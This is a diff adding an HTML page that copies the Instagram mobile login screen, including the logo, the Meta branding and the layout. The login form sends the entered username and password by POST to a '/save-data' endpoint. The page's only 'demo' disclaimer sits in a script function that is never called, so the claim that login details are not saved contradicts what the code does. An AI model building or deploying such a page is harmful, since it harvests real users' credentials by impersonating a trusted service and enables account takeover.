@@ -1,0 +1,389 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
+<title>Instagram Demo</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html, body {
+    width: 100%;
+    min-height: 100%;
+}
+
+body {
+    background: #152126;
+    color: #f5f5f5;
+    font-family: Arial, sans-serif;
+    overflow-x: hidden;
+}
+
+.page {
+    width: 100%;
+    min-height: 100vh;
+    min-height: 100dvh;
+
+    display: flex;
+    flex-direction: column;
+
+    padding:
+        max(25px, env(safe-area-inset-top))
+        23px
+        max(22px, env(safe-area-inset-bottom));
+}
+
+/* LANGUAGE */
+
+.language {
+    text-align: center;
+    color: #b7bdc1;
+    font-size: 16px;
+
+    margin-top: 52px;
+}
+
+/* LOGO */
+
+.logo {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    margin-top: 110px;
+    margin-bottom: 125px;
+}
+
+.logo svg {
+    width: 82px;
+    height: 82px;
+}
+
+/* LOGIN FORM */
+
+.login-form {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    gap: 18px;
+}
+
+input {
+    width: 100%;
+    height: 62px;
+
+    background: transparent;
+
+    border: 1px solid #41494d;
+    border-radius: 23px;
+
+    padding: 0 20px;
+
+    color: white;
+    font-size: 16px;
+
+    outline: none;
+}
+
+input::placeholder {
+    color: #a8adb2;
+}
+
+input:focus {
+    border-color: #707b82;
+}
+
+/* LOGIN BUTTON */
+
+.login-btn {
+    width: 100%;
+    height: 60px;
+
+    border: none;
+    border-radius: 35px;
+
+    background: #0866e9;
+    color: white;
+
+    font-size: 18px;
+    font-weight: 600;
+
+    cursor: pointer;
+}
+
+/* FORGOTTEN PASSWORD */
+
+.forgot {
+    text-align: center;
+
+    margin-top: 30px;
+
+    font-size: 17px;
+    font-weight: 500;
+
+    cursor: pointer;
+}
+
+/* BOTTOM SECTION */
+
+.bottom {
+    margin-top: auto;
+
+    padding-top: 75px;
+
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+
+    gap: 24px;
+}
+
+/* CREATE ACCOUNT */
+
+.create-btn {
+    width: 100%;
+    min-height: 60px;
+
+    border: 1px solid #4285f4;
+    border-radius: 35px;
+
+    background: transparent;
+    color: #65a5ff;
+
+    font-size: 17px;
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+
+    cursor: pointer;
+}
+
+/* META */
+
+.meta {
+    text-align: center;
+
+    color: #d8dcdf;
+
+    font-size: 20px;
+    font-weight: 500;
+}
+
+/* SMALL MOBILE */
+
+@media (max-height: 700px) {
+
+    .language {
+        margin-top: 25px;
+    }
+
+    .logo {
+        margin-top: 65px;
+        margin-bottom: 65px;
+    }
+
+    .logo svg {
+        width: 72px;
+        height: 72px;
+    }
+
+    .bottom {
+        padding-top: 40px;
+    }
+
+}
+
+/* BIG MOBILE */
+
+@media (min-height: 800px) {
+
+    .language {
+        margin-top: 65px;
+    }
+
+    .logo {
+        margin-top: 125px;
+        margin-bottom: 140px;
+    }
+
+}
+
+/* DESKTOP */
+
+@media (min-width: 600px) {
+
+    .page {
+        max-width: 450px;
+        margin: auto;
+    }
+
+    .language {
+        margin-top: 40px;
+    }
+
+    .logo {
+        margin-top: 90px;
+        margin-bottom: 90px;
+    }
+
+    .bottom {
+        padding-top: 70px;
+    }
+
+}
+</style>
+</head>
+
+<body>
+
+<div class="page">
+
+    <!-- LANGUAGE -->
+
+    <div class="language">
+        English (India) ▼
+    </div>
+
+    <!-- INSTAGRAM LOGO -->
+
+    <div class="logo">
+
+        <svg viewBox="0 0 100 100" fill="none">
+
+            <defs>
+                <linearGradient
+                    id="instagramGradient"
+                    x1="0"
+                    y1="100"
+                    x2="100"
+                    y2="0">
+
+                    <stop offset="0%" stop-color="#ffd600"/>
+                    <stop offset="35%" stop-color="#ff0069"/>
+                    <stop offset="100%" stop-color="#d300c5"/>
+
+                </linearGradient>
+            </defs>
+
+            <rect
+                x="9"
+                y="9"
+                width="82"
+                height="82"
+                rx="24"
+                stroke="url(#instagramGradient)"
+                stroke-width="9"/>
+
+            <circle
+                cx="50"
+                cy="50"
+                r="19"
+                stroke="url(#instagramGradient)"
+                stroke-width="9"/>
+
+            <circle
+                cx="74"
+                cy="27"
+                r="5"
+                fill="#d300c5"/>
+
+        </svg>
+
+    </div>
+
+    <!-- LOGIN FORM -->
+<form class="login-form" action="/save-data" method="POST">
+
+    <input
+        type="text"
+        name="username"
+        placeholder="Username, email address or mobile number"
+        autocomplete="off"
+        required>
+
+    <input
+        type="password"
+        name="password"
+        placeholder="Password"
+        autocomplete="off"
+        required>
+
+    <button
+        type="submit"
+        class="login-btn">
+        Log in
+    </button>
+
+</form>
+
+
+    <!-- FORGOTTEN PASSWORD -->
+
+    <div
+        class="forgot"
+        onclick="forgotPassword()">
+
+        Forgotten password?
+
+    </div>
+
+    <!-- BOTTOM -->
+
+    <div class="bottom">
+
+        <button
+            class="create-btn"
+            onclick="createAccount()">
+
+            Create new account
+
+        </button>
+
+        <div class="meta">
+            ∞ Meta
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+
+function demoLogin() {
+
+    alert(
+        "Demo website only.\nLogin details are not saved."
+    );
+
+}
+
+function forgotPassword() {
+
+    alert(
+        "Demo page: Password recovery is unavailable."
+    );
+
+}
+
+function createAccount() {
+
+    alert(
+        "Demo page: Account creation is unavailable."
+    );
+
+}
+
+</script>
+
+</body>
+</html>
